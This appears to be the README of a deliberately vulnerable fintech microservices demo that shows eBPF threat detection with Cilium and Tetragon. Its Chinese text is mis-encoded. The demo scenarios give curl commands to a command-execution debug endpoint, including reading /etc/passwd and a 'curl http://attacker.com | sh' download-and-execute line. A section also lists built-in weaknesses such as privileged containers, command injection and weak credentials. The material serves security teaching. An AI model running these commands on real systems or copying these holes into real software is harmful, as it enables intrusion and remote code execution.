# é‡‘èå¾®æœå‹™ eBPF å®‰å…¨æ¼”ç¤ºç³»çµ±

[![Version](https://img.shields.io/badge/version-3.0.0-blue.svg)](https://github.com/fintech-security/ebpf-demo)
[![Kubernetes](https://img.shields.io/badge/kubernetes-1.25+-green.svg)](https://kubernetes.io/)
[![eBPF](https://img.shields.io/badge/eBPF-Tetragon-purple.svg)](https://tetragon.io/)
[![Cilium](https://img.shields.io/badge/Cilium-1.14+-orange.svg)](https://cilium.io/)
[![License](https://img.shields.io/badge/license-MIT-lightgrey.svg)](LICENSE)

> **âš ï¸ å®‰å…¨è­¦å‘Š**: æ­¤ç³»çµ±åŒ…å«æ•…æ„è¨­è¨ˆçš„å®‰å…¨æ¼æ´ï¼Œåƒ…ç”¨æ–¼eBPFå®‰å…¨ç›£æ§æ¼”ç¤ºã€‚è«‹å‹¿åœ¨ç”Ÿç”¢ç’°å¢ƒä¸­ä½¿ç”¨ã€‚

## ğŸ¯ é …ç›®æ¦‚è¿°

é€™æ˜¯ä¸€å€‹å®Œæ•´çš„é‡‘èå¾®æœå‹™å®‰å…¨æ¼”ç¤ºç³»çµ±ï¼Œå±•ç¤ºå¦‚ä½•ä½¿ç”¨eBPFæŠ€è¡“ï¼ˆåŸºæ–¼Ciliumå’ŒTetragonï¼‰åœ¨Kubernetesç’°å¢ƒä¸­é€²è¡Œå¯¦æ™‚å®‰å…¨ç›£æ§å’Œå¨è„…æª¢æ¸¬ã€‚

### ğŸ—ï¸ ç³»çµ±æ¶æ§‹

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    React Frontend (éšæ®µ3)                   â”‚
â”‚              ç¾ä»£åŒ–é‡‘èäº¤æ˜“å’Œå®‰å…¨ç›£æ§ç•Œé¢                        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                 Kubernetes Cluster (éšæ®µ2)                  â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚ Trading API â”‚ Risk Engine â”‚ Payment GW  â”‚ Audit Svc   â”‚  â”‚
â”‚  â”‚   (Go)      â”‚    (Go)     â”‚    (Go)     â”‚    (Go)     â”‚  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚    PostgreSQL       â”‚           Redis                 â”‚  â”‚
â”‚  â”‚   (Database)        â”‚         (Cache)                 â”‚  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                 eBPF Security Layer                         â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚     Cilium CNI      â”‚        Tetragon                 â”‚  â”‚
â”‚  â”‚  eBPF Networking    â”‚    eBPF Security Monitor        â”‚  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

## ğŸš€ å¿«é€Ÿé–‹å§‹

### 1. ç’°å¢ƒè¦æ±‚

- **æ“ä½œç³»çµ±**: Linux (æ¨è–¦) æˆ– macOS
- **ç¡¬ä»¶è¦æ±‚**: è‡³å°‘ 8GB RAM, 4 CPU cores
- **è»Ÿä»¶ä¾è³´**:
  - Docker 20.10+
  - Kubernetes 1.25+
  - Kind 0.20+ æˆ–å…¶ä»–K8sé›†ç¾¤
  - kubectl
  - Helm 3.0+
  - Node.js 18+ (å‰ç«¯é–‹ç™¼)

### 2. ä¸€éµéƒ¨ç½²

```bash
# å…‹éš†é …ç›®
git clone <repository-url>
cd fintech-ebpf-demo

# éƒ¨ç½²å®Œæ•´ç³»çµ±
./deploy-all.sh
```

### 3. åˆ†éšæ®µéƒ¨ç½²

```bash
# éšæ®µ1: å¾Œç«¯å¾®æœå‹™å·²å®Œæˆ (åŒ…å«æ•…æ„æ¼æ´)
# éšæ®µ2: Kubernetes + eBPF å®‰å…¨ç›£æ§
cd k8s
./deploy.sh

# éšæ®µ3: React å‰ç«¯ç•Œé¢  
cd frontend
./build.sh deploy

# éšæ®µ4: æ”»æ“Šå ´æ™¯è…³æœ¬ (é–‹ç™¼ä¸­)
# éšæ®µ5: å®Œæ•´æ¼”ç¤ºç’°å¢ƒ (é–‹ç™¼ä¸­)
```

## ğŸ“Š åŠŸèƒ½ç‰¹æ€§

### ğŸ¦ é‡‘èæ¥­å‹™åŠŸèƒ½
- **äº¤æ˜“ç³»çµ±**: è‚¡ç¥¨ä¸‹å–®ã€è¨‚å–®ç®¡ç†ã€æŒå€‰è·Ÿè¹¤
- **é¢¨éšªæ§åˆ¶**: å¯¦æ™‚é¢¨éšªè©•ä¼°ã€é™é¡ç›£æ§ã€é¢¨éšªå ±å‘Š
- **æ”¯ä»˜ç¶²é—œ**: è³‡é‡‘åŠƒè½‰ã€æ”¯ä»˜è™•ç†ã€è³¬æˆ¶ç®¡ç†
- **å¯©è¨ˆæœå‹™**: äº¤æ˜“è¨˜éŒ„ã€åˆè¦æª¢æŸ¥ã€å¯©è¨ˆå ±å‘Š

### ğŸ”’ å®‰å…¨ç›£æ§åŠŸèƒ½
- **å¯¦æ™‚eBPFç›£æ§**: åŸºæ–¼Tetragonçš„ç³»çµ±èª¿ç”¨ç›£æ§
- **ç¶²çµ¡å®‰å…¨**: Ciliumç¶²çµ¡ç­–ç•¥å’Œæµé‡åˆ†æ
- **æ–‡ä»¶ç³»çµ±ç›£æ§**: æ•æ„Ÿæ–‡ä»¶è¨ªå•æª¢æ¸¬
- **é€²ç¨‹è¡Œç‚ºåˆ†æ**: å¯ç–‘å‘½ä»¤åŸ·è¡Œæª¢æ¸¬
- **å®‰å…¨äº‹ä»¶å¯è¦–åŒ–**: å¯¦æ™‚å®‰å…¨äº‹ä»¶æµå±•ç¤º

### ğŸ¨ ç”¨æˆ¶ç•Œé¢åŠŸèƒ½
- **ç¾ä»£åŒ–UI**: åŸºæ–¼React + Ant Designçš„éŸ¿æ‡‰å¼ç•Œé¢
- **å¯¦æ™‚æ•¸æ“š**: WebSocketå¯¦æ™‚æ›´æ–°äº¤æ˜“å’Œç›£æ§æ•¸æ“š
- **å®‰å…¨å„€è¡¨æ¿**: eBPFäº‹ä»¶å¯è¦–åŒ–å’Œå¨è„…åˆ†æ
- **æ”»æ“Šæ¨¡æ“¬**: ä¸€éµè§¸ç™¼å„ç¨®å®‰å…¨æ¸¬è©¦å ´æ™¯

## ğŸ§ª æ¼”ç¤ºå ´æ™¯

### å ´æ™¯1: æ­£å¸¸æ¥­å‹™æµç¨‹
1. **ç”¨æˆ¶ç™»éŒ„** â†’ æŸ¥çœ‹æŠ•è³‡çµ„åˆ
2. **å‰µå»ºè¨‚å–®** â†’ é¢¨éšªè©•ä¼° â†’ è¨‚å–®åŸ·è¡Œ
3. **å¯¦æ™‚ç›£æ§** â†’ eBPFè¨˜éŒ„æ­£å¸¸æ¥­å‹™è¡Œç‚º

### å ´æ™¯2: æ–‡ä»¶è¨ªå•æ”»æ“Š
```bash
# è§¸ç™¼æ–‡ä»¶è¨ªå•ç›£æ§
curl -X POST http://localhost:30080/debug/execute \
  -d '{"command":"cat","args":["/etc/passwd"]}'

# è§€å¯ŸTetragonäº‹ä»¶
kubectl logs -f -n kube-system -l app.kubernetes.io/name=tetragon
```

### å ´æ™¯3: ç¶²çµ¡å®‰å…¨å¨è„…
```bash
# è§¸ç™¼å¤–éƒ¨DNSæŸ¥è©¢ç›£æ§
curl -X POST http://localhost:30081/debug/execute \
  -d '{"command":"nslookup","args":["malicious-domain.com"]}'
```

### å ´æ™¯4: å‘½ä»¤æ³¨å…¥æ”»æ“Š
```bash
# è§¸ç™¼å‘½ä»¤åŸ·è¡Œç›£æ§
curl -X POST http://localhost:30082/debug/execute \
  -d '{"command":"sh","args":["-c","curl http://attacker.com | sh"]}'
```

## ğŸ“ é …ç›®çµæ§‹

```
fintech-ebpf-demo/
â”œâ”€â”€ k8s/                        # Kubernetes + eBPF éƒ¨ç½²é…ç½®
â”‚   â”œâ”€â”€ deploy.sh              # ä¸€éµéƒ¨ç½²è…³æœ¬
â”‚   â”œâ”€â”€ scripts/               # éƒ¨ç½²è…³æœ¬é›†åˆ
â”‚   â”œâ”€â”€ manifests/             # K8sè³‡æºé…ç½®
â”‚   â”‚   â”œâ”€â”€ database/          # æ•¸æ“šåº«æœå‹™
â”‚   â”‚   â”œâ”€â”€ microservices/     # Goå¾®æœå‹™
â”‚   â”‚   â””â”€â”€ frontend/          # å‰ç«¯æœå‹™
â”‚   â””â”€â”€ tetragon/              # Tetragonå®‰å…¨ç­–ç•¥
â”‚       â””â”€â”€ policies/          # eBPFç›£æ§ç­–ç•¥
â”œâ”€â”€ frontend/                   # Reactå‰ç«¯æ‡‰ç”¨
â”‚   â”œâ”€â”€ src/                   # æºä»£ç¢¼
â”‚   â”‚   â”œâ”€â”€ components/        # Reactçµ„ä»¶
â”‚   â”‚   â”œâ”€â”€ pages/             # é é¢çµ„ä»¶
â”‚   â”‚   â””â”€â”€ services/          # APIæœå‹™
â”‚   â”œâ”€â”€ build.sh               # å‰ç«¯æ§‹å»ºè…³æœ¬
â”‚   â”œâ”€â”€ Dockerfile             # å®¹å™¨åŒ–é…ç½®
â”‚   â””â”€â”€ package.json           # ä¾è³´é…ç½®
â”œâ”€â”€ microservices/             # Goå¾®æœå‹™ (éšæ®µ1å®Œæˆ)
â”‚   â”œâ”€â”€ trading-api/           # äº¤æ˜“APIæœå‹™
â”‚   â”œâ”€â”€ risk-engine/           # é¢¨éšªè©•ä¼°å¼•æ“
â”‚   â”œâ”€â”€ payment-gateway/       # æ”¯ä»˜ç¶²é—œ
â”‚   â””â”€â”€ audit-service/         # å¯©è¨ˆæœå‹™
â””â”€â”€ docs/                      # é …ç›®æ–‡æª”
    â”œâ”€â”€ architecture.md        # ç³»çµ±æ¶æ§‹æ–‡æª”
    â”œâ”€â”€ security.md            # å®‰å…¨åŠŸèƒ½èªªæ˜
    â””â”€â”€ deployment.md          # éƒ¨ç½²æŒ‡å—
```

## ğŸ”§ é…ç½®å’Œè¨ªå•

### æœå‹™ç«¯é»
éƒ¨ç½²å®Œæˆå¾Œï¼Œå¯é€šéä»¥ä¸‹ç«¯é»è¨ªå•å„æœå‹™ï¼š

- **å‰ç«¯ç•Œé¢**: http://localhost:30300
- **Trading API**: http://localhost:30080
- **Risk Engine**: http://localhost:30081  
- **Payment Gateway**: http://localhost:30082
- **Audit Service**: http://localhost:30083

### ç›£æ§å’Œèª¿è©¦
- **Grafanaå„€è¡¨æ¿**: http://localhost:30090 (admin/admin123)
- **PrometheusæŒ‡æ¨™**: http://localhost:30091
- **Hubble UI**: http://localhost:30012
- **èª¿è©¦ä¿¡æ¯**: http://localhost:30300/debug

### eBPFäº‹ä»¶ç›£æ§
```bash
# æŸ¥çœ‹å¯¦æ™‚eBPFäº‹ä»¶
kubectl logs -f -n kube-system -l app.kubernetes.io/name=tetragon

# æŸ¥çœ‹å®‰å…¨ç­–ç•¥
kubectl get tracingpolicies -A

# æª¢æŸ¥Ciliumç‹€æ…‹
cilium status
```

## ğŸ”’ å®‰å…¨æ¼”ç¤ºç‰¹æ€§

### æ•…æ„çš„å®‰å…¨æ¼æ´ (ç”¨æ–¼æ¼”ç¤º)

#### 1. å®¹å™¨å®‰å…¨å•é¡Œ
- **ç‰¹æ¬Šå®¹å™¨**: ä½¿ç”¨privilegedæ¨¡å¼é‹è¡Œ
- **ä¸»æ©Ÿæ›è¼‰**: æ›è¼‰æ•æ„Ÿä¸»æ©Ÿç›®éŒ„
- **Rootæ¬Šé™**: ä»¥rootç”¨æˆ¶é‹è¡Œå®¹å™¨

#### 2. ç¶²çµ¡å®‰å…¨å•é¡Œ  
- **éåº¦é–‹æ”¾**: å…è¨±æ‰€æœ‰ç¶²çµ¡æµé‡
- **ç¼ºå°‘åŠ å¯†**: æœå‹™é–“é€šä¿¡æœªåŠ å¯†
- **DNSæ´©éœ²**: å…è¨±å¤–éƒ¨DNSæŸ¥è©¢

#### 3. æ‡‰ç”¨å®‰å…¨å•é¡Œ
- **å‘½ä»¤æ³¨å…¥**: debugç«¯é»å…è¨±ä»»æ„å‘½ä»¤åŸ·è¡Œ
- **æ•æ„Ÿä¿¡æ¯æš´éœ²**: é…ç½®æ–‡ä»¶å’Œç’°å¢ƒè®Šé‡æ´©éœ²
- **å¼±èªè­‰**: ä½¿ç”¨å›ºå®šçš„å¼±å¯†ç¢¼å’Œtoken

#### 4. å‰ç«¯å®‰å…¨å•é¡Œ
- **XSSé¢¨éšª**: ä¸å®‰å…¨çš„HTMLæ¸²æŸ“
- **æ•æ„Ÿæ•¸æ“š**: åœ¨å‰ç«¯æš´éœ²APIå¯†é‘°
- **èª¿è©¦ä¿¡æ¯**: ç”Ÿç”¢ç’°å¢ƒä¿ç•™èª¿è©¦ç«¯é»

### eBPFç›£æ§èƒ½åŠ›
âœ… **æ–‡ä»¶ç³»çµ±ç›£æ§**: æª¢æ¸¬æ•æ„Ÿæ–‡ä»¶è¨ªå•  
âœ… **ç¶²çµ¡æµé‡åˆ†æ**: ç›£æ§å¯ç–‘å¤–éƒ¨é€£æ¥  
âœ… **é€²ç¨‹åŸ·è¡Œè·Ÿè¹¤**: è¨˜éŒ„å‘½ä»¤åŸ·è¡Œè¡Œç‚º  
âœ… **ç³»çµ±èª¿ç”¨ç›£æ§**: æª¢æ¸¬æ¬Šé™æå‡å˜—è©¦  
âœ… **åŠ å¯†æ“ä½œç›£æ§**: è·Ÿè¹¤å¯†é‘°æ“ä½œ  

## ğŸ§‘â€ğŸ’» é–‹ç™¼å’Œè²¢ç»

### é–‹ç™¼ç’°å¢ƒè¨­ç½®
```bash
# å¾Œç«¯é–‹ç™¼ (Go)
cd microservices
go mod tidy
go run ./trading-api

# å‰ç«¯é–‹ç™¼ (React)
cd frontend  
npm install
npm run dev
```

### æ¸¬è©¦å’Œé©—è­‰
```bash
# é‹è¡Œå®‰å…¨æ¸¬è©¦
./scripts/security-test.sh

# æª¢æŸ¥éƒ¨ç½²ç‹€æ…‹
./k8s/scripts/verify-deployment.sh

# è§¸ç™¼ç›£æ§äº‹ä»¶
./scripts/trigger-events.sh
```

## ğŸ“š ç›¸é—œè³‡æº

### æŠ€è¡“æ–‡æª”
- [eBPFå®˜æ–¹æ–‡æª”](https://ebpf.io/)
- [Ciliumæ–‡æª”](https://docs.cilium.io/)
- [Tetragonå®‰å…¨æŒ‡å—](https://tetragon.io/docs/)
- [Kuberneteså®‰å…¨æœ€ä½³å¯¦è¸](https://kubernetes.io/docs/concepts/security/)

### æ¼”ç¤ºå’Œæ•™ç¨‹
- [eBPFå®‰å…¨ç›£æ§æ¼”ç¤º](docs/ebpf-security-demo.md)
- [Kuberneteså®‰å…¨å¨è„…æª¢æ¸¬](docs/k8s-threat-detection.md)
- [é‡‘èè¡Œæ¥­å®‰å…¨åˆè¦](docs/fintech-compliance.md)

## ğŸ“„ è¨±å¯è­‰

æ­¤é …ç›®åŸºæ–¼ MIT è¨±å¯è­‰é–‹æºã€‚è©³è¦‹ [LICENSE](LICENSE) æ–‡ä»¶ã€‚

## âš ï¸ å…è²¬è²æ˜

æ­¤é …ç›®åƒ…ç”¨æ–¼æ•™è‚²å’Œæ¼”ç¤ºç›®çš„ã€‚åŒ…å«çš„å®‰å…¨æ¼æ´æ˜¯æ•…æ„è¨­è¨ˆçš„ï¼Œç”¨æ–¼å±•ç¤ºeBPFç›£æ§èƒ½åŠ›ã€‚è«‹å‹¿åœ¨ç”Ÿç”¢ç’°å¢ƒä¸­ä½¿ç”¨æ­¤ä»£ç¢¼ã€‚

---

**é–‹ç™¼åœ˜éšŠ**: FinTech Security Research Group  
**ç‰ˆæœ¬**: 3.0.0  
**æœ€å¾Œæ›´æ–°**: 2023-12-01 